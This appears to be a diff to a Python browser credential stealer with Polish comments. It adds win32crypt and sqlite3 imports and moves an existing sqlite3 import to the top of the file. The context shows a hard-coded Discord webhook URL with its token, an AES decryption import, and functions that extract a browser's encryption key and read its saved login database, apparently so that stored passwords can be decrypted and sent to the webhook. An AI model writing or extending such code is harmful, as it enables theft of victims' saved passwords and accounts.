@@ -5,6 +5,8 @@ import requests
 import json
 import base64
 from Cryptodome.Cipher import AES
+import win32crypt
+import sqlite3
 
 # URL webhooka Discorda
 webhook_url = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"
@@ -64,7 +66,6 @@ def extract_key(local_state_path):
 
 # Funkcja do odczytywania danych logowania
 def read_login_data(login_data_path, key):
-    import sqlite3
     logins = []
     try:
         conn = sqlite3.connect(login_data_path)
